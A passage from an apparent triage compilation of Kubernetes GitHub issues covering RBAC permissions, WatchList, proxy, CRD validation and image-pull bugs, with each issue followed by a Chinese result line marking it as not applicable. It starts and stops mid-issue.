#### Container runtime (CRI) and version (if applicable)

<details>
N/A
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### 分析结果

不涉及

---

## Issue #126232 system:kubelet-api-admin does not have permissions to issue checkpoint.

- Issue 链接：[#126232](https://github.com/kubernetes/kubernetes/issues/126232)

### Issue 内容

#### What happened?

kubelet recently started expoing a new checkpoint endpoint. A user must have RBAC `nodes/checkpoint` permission to call this endpoint. I believe we missed updating the `system:kubelet-api-admin` ClusterRole.

#### What did you expect to happen?

I expect `system:kubelet-api-admin` to have this permission. If this is intentional please document why?

#### How can we reproduce it (as minimally and precisely as possible)?

system:kubelet-api-admin is configured here
https://github.com/kubernetes/kubernetes/blob/b3e769b72ec1eb9d5f4928259633f75d8e373cb9/plugin/pkg/auth/authorizer/rbac/bootstrappolicy/policy.go#L392

The subject access review request for checkpoint endpoint is constructed here:

https://github.com/kubernetes/kubernetes/blob/b3e769b72ec1eb9d5f4928259633f75d8e373cb9/pkg/kubelet/server/auth.go#L108

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126206 WatchList failed when Accept content-type is Table

- Issue 链接：[#126206](https://github.com/kubernetes/kubernetes/issues/126206)

### Issue 内容

#### What happened?

When perform a List or WatchList with `Accept: application/json;as=Table;v=v1;g=meta.k8s.io`, api will convert every objects of response into `metav1.Table`. And as per the specification of the WatchList, a Bookmark event with `k8s.io/initial-events-end` should be sent after all initial events have been dispatched. Upon receiving this event, the client should close the watch and return the result.

However, when response in Table format is returned, the annotations are placed on the `metav1.Table.Rows` instead of the top level of the object. This causes misbehavior in `client-go`.

```
# curl 'http://localhost:8888/api/v1/pods?allowWatchBookmarks=true&watch=true&sendInitialEvents=true&resourceVersionMatch=NotOlderThan' -H 'Accept: application/json;as=Table;v=v1;g=meta.k8s.io'
...

{
  "type": "BOOKMARK",
  "object": {
    "kind": "Table",
    "apiVersion": "meta.k8s.io/v1",
    "metadata": {
      "resourceVersion": "457339"
    },
    "columnDefinitions": null,
    "rows": [
      {
        "cells": [
          "",
          "0/0",
          "",
          "0",
          "<unknown>",
          "<none>",
          "<none>",
          "<none>",
          "<none>"
        ],
        "object": {
          "kind": "PartialObjectMetadata",
          "apiVersion": "meta.k8s.io/v1",
          "metadata": {
            "resourceVersion": "457339",
            "creationTimestamp": null,
            "annotations": {
              "k8s.io/initial-events-end": "true"
            }
          }
        }
      }
    ]
  }
}
```

In the current implementation, an error `failed to parse watch event` will be thrown from `staging/src/k8s.io/client-go/rest/request.go:880`, and it will fall back to the standard List method.

#### What did you expect to happen?

WatchList works properly.

#### How can we reproduce it (as minimally and precisely as possible)?

It can be reproduced by below go code. by runnint the code, a warning message like `W0719 01:33:52.152868   45522 simple.go:308] The watchlist request for /v1, Resource=pods ended with an error, falling back to the standard LIST semantics, err = failed to parse watch event: watch.Event{Type:"ADDED", Object:(*v1.Table)(0x14000694870)}` can be found in terminal.

```go
package main

import (
	"context"
	"fmt"
	"os"
	"path"
	"strings"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	metav1beta1 "k8s.io/apimachinery/pkg/apis/meta/v1beta1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
	"k8s.io/klog/v2"
	"k8s.io/kubectl/pkg/scheme"
)

func main() {
	home, err := os.UserHomeDir()
	if err != nil {
		klog.Fatal(err)
	}

	cfg, err := clientcmd.BuildConfigFromFlags("", path.Join(home, ".kube/config"))
	if err != nil {
		klog.Fatal(err)
	}

	cfg.GroupVersion = &schema.GroupVersion{}
	cfg.AcceptContentTypes = strings.Join([]string{
		fmt.Sprintf("application/json;as=Table;v=%s;g=%s", metav1.SchemeGroupVersion.Version, metav1.GroupName),
		fmt.Sprintf("application/json;as=Table;v=%s;g=%s", metav1beta1.SchemeGroupVersion.Version, metav1beta1.GroupName),
		"application/json",
	}, ",")

	gv := corev1.SchemeGroupVersion
	cfg.GroupVersion = &gv
	cfg.APIPath = "/api"
	cfg.NegotiatedSerializer = scheme.Codecs.WithoutConversion()
	cfg.UserAgent = rest.DefaultKubernetesUserAgent()

	client, err := rest.RESTClientFor(cfg)
	if err != nil {
		klog.Fatal(err)
	}

	dynamicClient := dynamic.New(client)
	pods, err := dynamicClient.
		Resource(corev1.SchemeGroupVersion.WithResource("pods")).
		Namespace("kube-system").
		List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		klog.Fatal(err)
	}
	klog.Info(pods)
}
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0-beta.0.25+a70cb76847ada1-dirty
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126202 integration tests are painfully slow

- Issue 链接：[#126202](https://github.com/kubernetes/kubernetes/issues/126202)

### Issue 内容

This job is often taking well over an hour even with 8 cores and 20Gi assigned in prow. It used to be more like 30m or less.

(because these tests cases are mostly kubectl and apiserver)

A handful of specific tests seem to be large outliers

the CEL tests alone take 11+ minutes
> k8s.io/kubernetes/test/integration/apiserver: cel | 11m13s

/sig api-machinery

cc @jpbetz @cici37 

and OIDC
> k8s.io/kubernetes/test/integration/apiserver: oidc | 11m16s

/sig auth


> k8s.io/kubernetes/test/integration/controlplane: transformation | 14m33s

> k8s.io/kubernetes/test/integration: examples | 7m47s


api machinery again?


> k8s.io/kubernetes/test/integration: job | 14m16s

/sig apps

> k8s.io/kubernetes/test/integration: scheduler_perf | 9m34s

/sig scheduling

Most of the SIG CLI tests take a few seconds

NOTE: I only skimmed a few of the excessive results here, you can see all of the timings if you expand the "174/174 tests passed!" field

https://prow.k8s.io/view/gs/kubernetes-jenkins/pr-logs/pull/126191/pull-kubernetes-integration/1813929954224640000






can we do something about this folks?

/kind bug

### 分析结果

不涉及

---

## Issue #126195 [FG:InPlacePodVerticalScaling] Minimum CPU request is displayed when only memory request is configured

- Issue 链接：[#126195](https://github.com/kubernetes/kubernetes/issues/126195)

### Issue 内容

#### What happened?

If `InPlacePodVerticalScaling` is enabled and only a memory resource request is configured in a pod, the minimum CPU request set internally is displayed in the pod status:
```
$ kubectl get pod testpod -o jsonpath='spec: {.spec.containers[0].resources}{"\nallocatedResources: "}{.status.containerStatuses[0].allocatedResources}{"\nstatus: "}{.status.containerStatuses[0].resources}{"\n"}'
spec: {"requests":{"memory":"200Mi"}}
allocatedResources: {"memory":"200Mi"}
status: {"requests":{"cpu":"2m","memory":"200Mi"}}
```


#### What did you expect to happen?

The minimum CPU request is not displayed in the pod status.


#### How can we reproduce it (as minimally and precisely as possible)?

1. Enables the `InPlacePodVerticalScaling` feature.
2. Create a pod where only memory request is configured:
   <Details>

   ```
   apiVersion: v1
   kind: Pod
   metadata:
     labels:
       run: testpod
     name: testpod
   spec:
     containers:
     - image: nginx
       name: testpod
       resources:
         requests:
           memory: 200Mi
     restartPolicy: Always
   ```

   </Details>
3. See its resources in the pod status:
   ```
   $ kubectl get pod testpod -o jsonpath='spec: {.spec.containers[0].resources}{"\nallocatedResources: "}{.status.containerStatuses[0].allocatedResources}{"\nstatus: "}{.status.containerStatuses[0].resources}{"\n"}'
   spec: {"requests":{"memory":"200Mi"}}
   allocatedResources: {"memory":"200Mi"}
   status: {"requests":{"cpu":"2m","memory":"200Mi"}}
   ```



#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126211 CVE-2024-5037 and CVE-2023-44487 not listed in the official feed?

- Issue 链接：[#126211](https://github.com/kubernetes/kubernetes/issues/126211)

### Issue 内容

Is there a reason why these vulnerabilities are not part of the [official feed](https://kubernetes.io/docs/reference/issues-security/official-cve-feed/) although they have been fixed here:

https://github.com/kubernetes/kubernetes/pull/123540
https://github.com/kubernetes/kubernetes/pull/121120


### 分析结果

不涉及

---

## Issue #126186 kubelet may provide a warning event or log when pod mount a wrong subpath from configmap

- Issue 链接：[#126186](https://github.com/kubernetes/kubernetes/issues/126186)

### Issue 内容

#### What happened?

When I put a **wrong subpath** in the pod, the pod still can start without any warning.
- the subpath cannot be found in the keys of the configmap volume.


#### What did you expect to happen?

- kubelet may provide a warning event or log when pod mount a wrong subpath from configmap

for instance, if the configmap does not exists,
- the pod cannot start
- and there will be a warning event like 
```
4m39s       Warning   FailedMount               pod/nginx-pod-2   MountVolume.SetUp failed for volume "config-volume" : configmap "my-config-2" not found
```

But if we use subpath mount, if the key is not exist, the pod can start.


#### How can we reproduce it (as minimally and precisely as possible)?

```
[root@node ~]# cat subpath/subpath2.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: my-config
data:
  index.html: |
    <html>
    <body>
    <h1>Hello, World!</h1>
    </body>
    </html>

---

apiVersion: v1
kind: Pod
metadata:
  name: nginx-pod
spec:
  containers:
  - name: nginx-container
    image: nginx:1.25.3-alpine
    volumeMounts:
    - name: config-volume
      mountPath: /usr/share/nginx/html/index2.html
      subPath: index2.html
  volumes:
  - name: config-volume
    configMap:
      name: my-config
```

This pod can start. 

#### Anything else we need to know?

Workarounds
1. the application can fail if nothing mounted: the problem may be that we may have default files or behavior which may not fail
2. check before applying:
  -  for instance, we can check it in the devops pipeline 
  -  use webhook to verify


#### Kubernetes version

1.30

#### Cloud provider

VM

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Rocky Linux"
VERSION="9.2 (Blue Onyx)"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.2"
$ uname -a
Linux node 5.14.0-284.11.1.el9_2.x86_64 #1 SMP PREEMPT_DYNAMIC Tue May 9 17:09:15 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux


```
</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
 containerd --version
containerd containerd.io 1.6.33 d2d58213f83a351ca8f528a95fbd145f5654e957
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
cilium
</details>


### 分析结果

不涉及

---

## Issue #126175 API Server fails validation for CRDs embedding resources with optional fields without omitempty when there is webhook

- Issue 链接：[#126175](https://github.com/kubernetes/kubernetes/issues/126175)

### Issue 内容

#### What happened?

Validation errors are returned by API server when trying to create a valid JobSet 0.5.2 embedding JobTemplate with pod failure policy, using k8s 1.30.2. The Job template is correct - there is no validation error when created without the JobSet wrapper. The errors are only returned when the JobSet webhook is installed.


#### What did you expect to happen?

No validation errors when creating JobSet which embeds a valid JobTemplate.

#### How can we reproduce it (as minimally and precisely as possible)?

0. Start a k8s cluster on kind in version 1.30.2 (the last version before the mitigation in https://github.com/kubernetes/kubernetes/pull/126046)
1. Install JobSet 0.5.2 in `kubectl apply --server-side -f https://github.com/kubernetes-sigs/jobset/releases/download/v0.5.2/manifests.yaml` (note that JobSet is running a JobSet webhook)
2. Attempt to create the following JobSet

```yaml
apiVersion: jobset.x-k8s.io/v1alpha2
kind: JobSet
metadata:
  generateName: failurepolicy-abcdef
spec:
  replicatedJobs:
  - name: leader
    replicas: 1
    template:
      spec:
        completions: 2
        parallelism: 2
        template:
          spec:
            restartPolicy: Never
            containers:
            - name: leader
              image: bash:latest
              command:
              - bash
              - -xc
              - |
                for i in $(seq 1 1000)
                do
                  echo "$i"
                  sleep 1
                done
        podFailurePolicy:
          rules:
          - action: FailJob
            onPodConditions:
            - type: DisruptionTarget
          - action: Ignore
            onExitCodes:
              operator: In
              values: [ 42 ]
```
Issue: the creation fails with 
```
> k create -f jobset.yaml
The JobSet "failurepolicy-abcdef" is invalid: 
* spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[0].onExitCodes: Invalid value: "null": spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[0].onExitCodes in body must be of type object: "null"
* spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[1].onExitCodes.containerName: Invalid value: "null": spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[1].onExitCodes.containerName in body must be of type string: "null"
* spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[1].onPodConditions: Invalid value: "null": spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[1].onPodConditions in body must be of type array: "null"
* <nil>: Invalid value: "null": some validation rules were not checked because the object was invalid; correct the existing errors to complete validation
```



#### Anything else we need to know?

This is a root cause of https://github.com/kubernetes/kubernetes/issues/126040 which was mitigated by  https://github.com/kubernetes/kubernetes/pull/126046.

Note that the creation succeeds when the JobSet webhook is deleted. Example response from the webook intercepted at level 10 (as per [comment](https://github.com/kubernetes/kubernetes/pull/126046#issuecomment-2225932024):

```
[{"op":"add","path":"/metadata/creationTimestamp","value":null},
{"op":"add","path":"/spec/replicatedJobs/0/template/metadata","value":{"creationTimestamp":null}},
{"op":"add","path":"/spec/replicatedJobs/0/template/spec/template/metadata","value":{"creationTimestamp":null}},
{"op":"add","path":"/spec/replicatedJobs/0/template/spec/template/spec/containers/0/resources","value":{}},
{"op":"add","path":"/spec/replicatedJobs/0/template/spec/completionMode","value":"Indexed"},
{"op":"add","path":"/spec/replicatedJobs/0/template/spec/podFailurePolicy/rules/0/onExitCodes","value":null},
{"op":"add","path":"/spec/replicatedJobs/0/template/spec/podFailurePolicy/rules/0/onPodConditions/0/status","value":""},
{"op":"add","path":"/spec/replicatedJobs/0/template/spec/podFailurePolicy/rules/1/onExitCodes/containerName","value"
:null},{"op":"add","path":"/spec/replicatedJobs/0/template/spec/podFailurePolicy/rules/1/onPodConditions","value":null},
{"op":"add","path":"/spec/network","value":{"enableDNSHostnames":true}},
{"op":"add","path":"/spec/successPolicy","value":{"operator":"All"}},{"op":"add","path":"/spec/startupPolicy","value":
{"startupPolicyOrder":"AnyOrder"}},{"op":"add","path":"/status","value":{}}]
```
The probable root cause: https://github.com/kubernetes/kubernetes/pull/126046#issuecomment-2233773781


#### Kubernetes version

<details>

1.30.2

</details>


#### Cloud provider

<details>
Kind, GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126170 Error during pulling of v.1.30.3 images

- Issue 链接：[#126170](https://github.com/kubernetes/kubernetes/issues/126170)

### Issue 内容

#### What happened?

I was trying to create a new k8s cluster and there was now way to pull images for v1.30.3.
_kubeadm init_ command gives the same results.

`[ERROR ImagePull]: failed to pull image registry.k8s.io/kube-apiserver:v1.30.3: output: E0717 17:53:46.785794   43580 remote_image.go:180] "PullImage from image service failed" err="rpc error: code = NotFound desc = failed to pull and unpack image \"registry.k8s.io/kube-apiserver:v1.30.3\": failed to resolve reference \"registry.k8s.io/kube-apiserver:v1.30.3\": registry.k8s.io/kube-apiserver:v1.30.3: not found" image="registry.k8s.io/kube-apiserver:v1.30.3"
time="2024-07-17T17:53:46+02:00" level=fatal msg="pulling image: rpc error: code = NotFound desc = failed to pull and unpack image \"registry.k8s.io/kube-apiserver:v1.30.3\": failed to resolve reference \"registry.k8s.io/kube-apiserver:v1.30.3\": registry.k8s.io/kube-apiserver:v1.30.3: not found"
, error: exit status 1
        [ERROR ImagePull]: failed to pull image registry.k8s.io/kube-controller-manager:v1.30.3: output: E0717 17:53:48.966539   43682 remote_image.go:180] "PullImage from image service failed" err="rpc error: code = NotFound desc = failed to pull and unpack image \"registry.k8s.io/kube-controller-manager:v1.30.3\": failed to resolve reference \"registry.k8s.io/kube-controller-manager:v1.30.3\": registry.k8s.io/kube-controller-manager:v1.30.3: not found" image="registry.k8s.io/kube-controller-manager:v1.30.3"
time="2024-07-17T17:53:48+02:00" level=fatal msg="pulling image: rpc error: code = NotFound desc = failed to pull and unpack image \"registry.k8s.io/kube-controller-manager:v1.30.3\": failed to resolve reference \"registry.k8s.io/kube-controller-manager:v1.30.3\": registry.k8s.io/kube-controller-manager:v1.30.3: not found"
, error: exit status 1
        [ERROR ImagePull]: failed to pull image registry.k8s.io/kube-scheduler:v1.30.3: output: E0717 17:53:51.057338   43761 remote_image.go:180] "PullImage from image service failed" err="rpc error: code = NotFound desc = failed to pull and unpack image \"registry.k8s.io/kube-scheduler:v1.30.3\": failed to resolve reference \"registry.k8s.io/kube-scheduler:v1.30.3\": registry.k8s.io/kube-scheduler:v1.30.3: not found" image="registry.k8s.io/kube-scheduler:v1.30.3"
time="2024-07-17T17:53:51+02:00" level=fatal msg="pulling image: rpc error: code = NotFound desc = failed to pull and unpack image \"registry.k8s.io/kube-scheduler:v1.30.3\": failed to resolve reference \"registry.k8s.io/kube-scheduler:v1.30.3\": registry.k8s.io/kube-scheduler:v1.30.3: not found"
, error: exit status 1`



#### What did you expect to happen?

I was expecting images to be correctly pulled from registry.k8s.io

#### How can we reproduce it (as minimally and precisely as possible)?

Try to upgrade current kubernetes cluster to version 1.30.3 using 

`killall -s SIGTERM kube-apiserver && sleep 30 && kubeadm upgrade apply v1.30.3`

or simply use `kubeadm config images pull` to pull latest kubernetes images

#### Anything else we need to know?

_No response_


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# NAME="Rocky Linux"
VERSION="9.4 (Blue Onyx)"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.4"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Rocky Linux 9.4 (Blue Onyx)"
ANSI_COLOR="0;32"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:rocky:rocky:9::baseos"
HOME_URL="https://rockylinux.org/"
BUG_REPORT_URL="https://bugs.rockylinux.org/"
SUPPORT_END="2032-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-9"
ROCKY_SUPPORT_PRODUCT_VERSION="9.4"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.4"
$ uname -a
#5.14.0-427.24.1.el9_4.x86_64 #1 SMP PREEMPT_DYNAMIC Mon Jul 8 17:47:19 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


#### Kubernetes version

<details>

```console
$ kubectl version
# Client Version: v1.30.3
#Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
#Server Version: v1.30.2
```


```
</details>



#### Cloud provider

On Prem.




/sig cli 

### 分析结果

不涉及

---

## Issue #126168 Intermittent error on new Nodes: "Unable to locate credentials"

- Issue 链接：[#126168](https://github.com/kubernetes/kubernetes/issues/126168)

### Issue 内容

#### What happened?

We have pods with an entry point script which first downloads many files from s3 using the aws CLI. This is a very intermittent issue. Our theory is that it relates to large Nodes (72+ CPU capacity) and having many of these pods scheduled at the same time, causing some race condition.

The full error message is
```
Unable to locate credentials. You can configure credentials by running "aws configure"
```

We implemented a retry in our scripts that will retry 20 times, but have noticed it succeeds after the second try.

#### What did you expect to happen?

The aws CLI command should be able to configure itself with the credentials file successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

We have not been able to reliably reproduce this issue every time.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28
</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
5.10.219-208.866.amzn2.x86_64 
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd://1.7.11
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126138 PodDeletionCost occasionally doesn't work

- Issue 链接：[#126138](https://github.com/kubernetes/kubernetes/issues/126138)

### Issue 内容

#### What happened?

I created a `ReplicationController` with 1 replicas:
analysis-3-8hplt

Then I set the replicas of the rc to 2 using the `scale` command, Created a new pod: `analysis-3-fbcdl`

(2024-07-11T22:38:10.280375Z )Next, I  set the annotation `controller.kubernetes.io/pod-deletion-cost: "-1"` for the pod: analysis-3-8hplt

After setting the annotation successfully, (2024-07-11T22:38:10.904066Z)Then I set the replicas of the rc to 1 using the `scale` command, but `analysis-3-fbcdl` was scaled.


#### What did you expect to happen?

` analysis-3-8hplt` pod was scaled.

#### How can we reproduce it (as minimally and precisely as possible)?

Refer to the description above

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
1.22 
```

</details>


#### Cloud provider

<details>
no
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126134 Kubectl Versions >= 1.30 Don't Allow Exec When HTTPS Scheme in proxy-url

- Issue 链接：[#126134](https://github.com/kubernetes/kubernetes/issues/126134)

### Issue 内容

#### What happened?

Starting on version 1.30, `kubectl exec` craps out when `proxy-url` setting has an HTTPS scheme.

> Note that other operations (e.g. `kubectl get <resource>`) work as expected, it is only `exec` that does not work.

```
10:47 $ cat ~/.kube/config | yq .clusters[0].cluster.proxy-url
https://kind-cluster-from-laptop-olympus.border0.io:1443
```

```
10:48 $ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

```
10:49 $ kubectl exec -it alpine-6b45654984-8lqcq -- sh
error: proxy: unknown scheme: https
✘-1 ~
```

Here's the full debug logs:

<details>

```
11:05 $ kubectl --v=8 exec -it alpine-6b45654984-8lqcq -- sh
I0716 11:05:53.288983   62338 loader.go:395] Config loaded from file:  /Users/adriano/.kube/config
I0716 11:05:53.291635   62338 round_trippers.go:463] GET https://kind-cluster-from-laptop-olympus.border0.io/api/v1/namespaces/default/pods/alpine-6b45654984-8lqcq
I0716 11:05:53.291782   62338 round_trippers.go:469] Request Headers:
I0716 11:05:53.291794   62338 round_trippers.go:473]     Accept: application/json, */*
I0716 11:05:53.291797   62338 round_trippers.go:473]     User-Agent: kubectl/v1.30.2 (darwin/arm64) kubernetes/3968350
I0716 11:05:53.730420   62338 round_trippers.go:574] Response Status: 200 OK in 438 milliseconds
I0716 11:05:53.730511   62338 round_trippers.go:577] Response Headers:
I0716 11:05:53.730537   62338 round_trippers.go:580]     X-Kubernetes-Pf-Prioritylevel-Uid: 0c04f4cf-c63a-4fc5-8f57-3b7c18f9800c
I0716 11:05:53.730553   62338 round_trippers.go:580]     Audit-Id: cf974e60-4df6-4c09-bc44-604a2ff6e9ce
I0716 11:05:53.730564   62338 round_trippers.go:580]     Cache-Control: no-cache, private
I0716 11:05:53.730571   62338 round_trippers.go:580]     Content-Type: application/json
I0716 11:05:53.730579   62338 round_trippers.go:580]     Date: Tue, 16 Jul 2024 18:05:53 GMT
I0716 11:05:53.730586   62338 round_trippers.go:580]     X-Kubernetes-Pf-Flowschema-Uid: dac17d0d-1c79-4632-a567-77ac067e87a1
I0716 11:05:53.731323   62338 request.go:1212] Response Body: {"kind":"Pod","apiVersion":"v1","metadata":{"name":"alpine-6b45654984-8lqcq","generateName":"alpine-6b45654984-","namespace":"default","uid":"c852cc5b-7a05-4221-a165-de67020a1e21","resourceVersion":"554","creationTimestamp":"2024-07-16T00:13:37Z","labels":{"app":"alpine","pod-template-hash":"6b45654984"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"ReplicaSet","name":"alpine-6b45654984","uid":"003afd22-0098-4ed8-bdee-0490f4f6533c","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2024-07-16T00:13:37Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:app":{},"f:pod-template-hash":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"003afd22-0098-4ed8-bdee-0490f4f6533c\"}":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"alpine\"}":{".":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{ [truncated 3749 chars]
I0716 11:05:53.737452   62338 podcmd.go:88] Defaulting container name to alpine
I0716 11:05:53.738803   62338 round_trippers.go:463] GET https://kind-cluster-from-laptop-olympus.border0.io/api/v1/namespaces/default/pods/alpine-6b45654984-8lqcq/exec?command=sh&container=alpine&stdin=true&stdout=true&tty=true
                I0716 11:05:53.738828   62338 round_trippers.go:469] Request Headers:
                                                                                     I0716 11:05:53.738840   62338 round_trippers.go:473]     Sec-Websocket-Protocol: v5.channel.k8s.io
                                                                             I0716 11:05:53.738849   62338 round_trippers.go:473]     User-Agent: kubectl/v1.30.2 (darwin/arm64) kubernetes/3968350
                                                                                         I0716 11:05:53.738891   62338 round_trippers.go:574] Response Status:  in 0 milliseconds
                                                                       I0716 11:05:53.738901   62338 round_trippers.go:577] Response Headers:
                                   error: proxy: unknown scheme: https
```

</details>

This does not happen if I downgrade my client to v 1.29

```
10:57 $ kubectl version
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

```
10:58 $ kubectl exec -it alpine-6b45654984-8lqcq -- sh
/ # ls
bin           home          mnt           product_uuid  sbin          tmp
dev           lib           opt           root          srv           usr
etc           media         proc          run           sys           var
/ # exit
✔ ~
```

#### What did you expect to happen?

I expect `kubectl` to allow and respect `proxy-url`s  with HTTPS scheme.

#### How can we reproduce it (as minimally and precisely as possible)?

See "what happened" section. Set up an HTTPS proxy, and note that v1.30+ do not work.

#### Anything else we need to know?

N.A

#### Kubernetes version

<details>

```console
10:57 $ kubectl version
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

<details>

N/A - Kind cluster on my Macbook

</details>


#### OS version

<details>

N/A - Kind cluster on my Macbook

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126132 CRD validation rule: escape would overwrite the field whose name is in escape format

- Issue 链接：[#126132](https://github.com/kubernetes/kubernetes/issues/126132)

### Issue 内容

#### What happened?

In [CRD validation rules](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#validation-rules), there are a list of [CEL reserved keywords](https://github.com/google/cel-spec/blob/v0.6.0/doc/langdef.md#syntax) which are applied by escaping rules.
e.g. for CRD schema:
```yaml
spec:
  ref:
    name: myName
    namespace: myNamespace 
```
since `namespace` is a reserved keyword, use `__namespace__` inside the cel expression to respect the escaping rule like `self.ref.__namespace__ != ""`.
But if there is already a field name conflict with the escaped format, it will be overwritten. 
e.g. for crd schema
```yaml
spec:
  ref:
    name: myName
    namespace: myNamespace 
    __namespace__: 10
```
The fieldName `__namespace__`  will be overwritten hence the value of  `__namespace__` will be lost.

#### What did you expect to happen?

The value of any fieldName should not be lost.

#### How can we reproduce it (as minimally and precisely as possible)?

Write CRD schema with any reserved keyword and escaped format of that keyword together, use it in validation rule.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126130 Implement a kube-proxy conntrack reconciler

- Issue 链接：[#126130](https://github.com/kubernetes/kubernetes/issues/126130)

### Issue 内容

#### What would you like to be added?

